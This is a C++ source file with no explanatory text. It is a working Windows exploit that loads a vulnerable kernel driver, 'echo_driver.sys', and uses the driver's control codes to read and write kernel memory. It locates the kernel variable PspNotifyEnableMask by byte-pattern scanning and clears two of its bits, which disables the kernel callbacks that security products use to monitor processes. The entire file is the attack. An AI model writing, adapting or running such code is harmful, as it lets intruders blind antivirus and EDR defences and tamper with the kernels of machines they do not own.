#include <iostream>
#include <Windows.h>

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation, // q: SYSTEM_BASIC_INFORMATION
    SystemProcessorInformation, // q: SYSTEM_PROCESSOR_INFORMATION
    SystemPerformanceInformation, // q: SYSTEM_PERFORMANCE_INFORMATION
    SystemTimeOfDayInformation, // q: SYSTEM_TIMEOFDAY_INFORMATION
    SystemPathInformation, // not implemented
    SystemProcessInformation, // q: SYSTEM_PROCESS_INFORMATION
    SystemCallCountInformation, // q: SYSTEM_CALL_COUNT_INFORMATION
    SystemDeviceInformation, // q: SYSTEM_DEVICE_INFORMATION
    SystemProcessorPerformanceInformation, // q: SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION (EX in: USHORT ProcessorGroup)
    SystemFlagsInformation, // q: SYSTEM_FLAGS_INFORMATION
    SystemCallTimeInformation, // not implemented // SYSTEM_CALL_TIME_INFORMATION // 10
    SystemModuleInformation, // q: RTL_PROCESS_MODULES
}SYSTEM_INFORMATION_CLASS;
typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
    PVOID Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;
typedef struct _RTL_PROCESS_MODULES
{
    ULONG NumberOfModules;
    _Field_size_(NumberOfModules) RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);
HANDLE hDevice = NULL;

BOOLEAN LoadDriver(LPCWSTR driverName, LPCWSTR driverPath) {

    SC_HANDLE ScMgr = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!ScMgr) {
        std::cerr << "OpenSCManager failed: " << GetLastError() << std::endl;
        return FALSE;
    }
    SC_HANDLE hService;
    hService = CreateService(ScMgr, driverName, driverName, SERVICE_START | SERVICE_STOP | DELETE, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL, NULL, NULL);

    if (!hService) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            hService = OpenService(ScMgr, driverName, SERVICE_START | SERVICE_STOP | DELETE);
        }
        else {
            std::cerr << "CreateService failed: " << GetLastError() << std::endl;
            CloseServiceHandle(ScMgr);
            return FALSE;
        }
    }

    BOOLEAN bSuccess = StartService(hService, NULL, NULL);
    if (!bSuccess) {
        std::cerr << "StartService failed: " << GetLastError() << std::endl;

    }
    CloseServiceHandle(hService);
    CloseServiceHandle(ScMgr);

    return TRUE;
}
BOOLEAN UnLoadDriver(LPCWSTR driverName) {
    SC_HANDLE ScMgr = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!ScMgr) {
        std::cerr << "OpenSCManager failed: " << GetLastError() << std::endl;
        return false;
    }
    SC_HANDLE hService = OpenService(ScMgr, driverName, SERVICE_START | SERVICE_STOP | DELETE);
    SERVICE_STATUS serviceStatus = {};
    if (ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        std::cout << "Service stopped successfully." << std::endl;
    }
    else if (GetLastError() != ERROR_SERVICE_NOT_ACTIVE) {
        std::cerr << "ControlService failed: " << GetLastError() << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(ScMgr);
        return false;
    }

    if (!DeleteService(hService)) {
        std::cerr << "DeleteService failed: " << GetLastError() << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(ScMgr);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(ScMgr);
    return true;


}
BOOLEAN initDriverComm() {
    hDevice = CreateFile(L"\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    PVOID buf = (PVOID)malloc(0x1000);
    DWORD retBytes;

    return DeviceIoControl(hDevice, 0x9E6A0594, NULL, NULL, buf, sizeof(buf), &retBytes, NULL);
}
typedef struct _ProcessHandleStruct{
    DWORD pid;
    ACCESS_MASK Mask;
    HANDLE hProcess;
}ProcessHandleStruct,*PProcessHandleStruct;

HANDLE getHandle(DWORD pid) {
    PProcessHandleStruct pHandleSruct = (PProcessHandleStruct)malloc(sizeof(ProcessHandleStruct));
    pHandleSruct->pid = pid;
    pHandleSruct->Mask = PROCESS_ALL_ACCESS;
    DWORD retBytes;
    HANDLE hProcess = NULL;
    DeviceIoControl(hDevice, 0xE6224248, pHandleSruct, sizeof(ProcessHandleStruct), pHandleSruct, sizeof(ProcessHandleStruct), &retBytes, NULL);
    
    return pHandleSruct->hProcess;
}

typedef struct _RWStruct{
    HANDLE hProcess;            // 0x0
    PVOID sourceAddr;           // 0x8
    PVOID targetAddr;           // 0x10
    SIZE_T size;                // 0x18
    PSIZE_T  numOfBytesCopyied; // 0x20
    NTSTATUS ret;               // 0x28
    ULONG unUse2;               // 0x2c
}RWStruct,*PRWStruct;

#define STATUS_SUCCESS			((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL		((NTSTATUS)0xC0000001L)


NTSTATUS copyMem(HANDLE hProcess,PVOID srcAddr,PVOID destAddr,SIZE_T size, PSIZE_T numOfBytesCopyied) {
    PRWStruct prwStruct = (PRWStruct)malloc(sizeof(RWStruct));
    prwStruct->hProcess = hProcess;
    prwStruct->sourceAddr = srcAddr;
    prwStruct->targetAddr = destAddr;
    prwStruct->size = size;
    prwStruct->numOfBytesCopyied = numOfBytesCopyied;

    DWORD retBytes;


    BOOLEAN isCommSuccess = DeviceIoControl(hDevice, 0x60A26124, prwStruct, sizeof(RWStruct), prwStruct, sizeof(RWStruct), &retBytes, NULL);
    if (isCommSuccess) {
        return STATUS_SUCCESS;
    }
    else{
        return STATUS_UNSUCCESSFUL;
    }
}

PVOID getNtosKrnlBase() {
    HMODULE ntdll = LoadLibrary(L"ntdll.dll");
    pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");        
    
    RTL_PROCESS_MODULES info = { 0 };
    NtQuerySystemInformation(SystemModuleInformation, &info,sizeof(RTL_PROCESS_MODULES), NULL);

    return info.Modules->ImageBase;
}
PVOID GetProcAddressFromNtosKrnl(LPCSTR funcName) {
    static ULONG_PTR moduleBase = NULL;
    ULONG_PTR offset = ((ULONG_PTR)GetProcAddress(LoadLibrary(L"ntoskrnl.exe"), funcName) - (ULONG_PTR)LoadLibrary(L"ntoskrnl.exe"));
    
    if (!moduleBase) moduleBase = (ULONG_PTR)getNtosKrnlBase();
    return (PVOID)(moduleBase + offset);
}
ULONG64 GetPspNotifyEnableMask() {
    ULONG_PTR PspNotifyEnableMask = NULL;
    PUCHAR PoRegisterCoalescingCallback = (PUCHAR)GetProcAddressFromNtosKrnl("PoRegisterCoalescingCallback");
    PUCHAR tem = (PUCHAR)malloc(0x500);
    memset(tem, 0, 0x500);
    SIZE_T numOfWrittenBytes;

    // HANDLE hProcess = getHandle(GetCurrentProcessId());
    NTSTATUS status = copyMem(GetCurrentProcess(), PoRegisterCoalescingCallback, tem, 0x500, &numOfWrittenBytes);

    if (status >= 0) {
        tem += 0x100;
        for (int i = 0; i <= 0xfff; i++) {
            if (tem[i] == 0x8b && tem[i + 1] == 0x05 && tem[i + 6] == 0xA8 && tem[i + 7] == 0x04) {
                LONG offset = *(PLONG)(tem + i + 2);
                PspNotifyEnableMask = (ULONG64)(PoRegisterCoalescingCallback + 0x100 + i + 6 + offset);
                return PspNotifyEnableMask;
            }
        }
    }

    return NULL;
}

void SetPspNotifyEnableMask(int bit, BOOLEAN isEnable) {
    static ULONG_PTR PspNotifyEnableMask = NULL;
    if (!PspNotifyEnableMask) {
        PspNotifyEnableMask = GetPspNotifyEnableMask();
    }// R0 addr

    if (PspNotifyEnableMask) {
        PULONG val = (PULONG)malloc(sizeof(ULONG));
        memset(val, 0, sizeof(ULONG));
        SIZE_T numOfWrittenBytes = 0;

        copyMem(GetCurrentProcess(), (PVOID)PspNotifyEnableMask, val, sizeof(ULONG),&numOfWrittenBytes);
        
        if (isEnable) {
            *val = (*val | (1 << bit));
            copyMem(GetCurrentProcess(), val, (PVOID)PspNotifyEnableMask, sizeof(ULONG), &numOfWrittenBytes);
        }
        else {
            *val = (*val & (~(1 << bit)));
            copyMem(GetCurrentProcess(), val, (PVOID)PspNotifyEnableMask, sizeof(ULONG), &numOfWrittenBytes);
        }

    }

}
int main() {
    LoadDriver(L"EchoDriver",L"C:\\echo_driver.sys");
    initDriverComm();

    SetPspNotifyEnableMask(3, FALSE);
    SetPspNotifyEnableMask(4, FALSE);
    system("pause");
    SetPspNotifyEnableMask(3, TRUE);
    SetPspNotifyEnableMask(4, TRUE);


    UnLoadDriver(L"EchoDriver");
    }

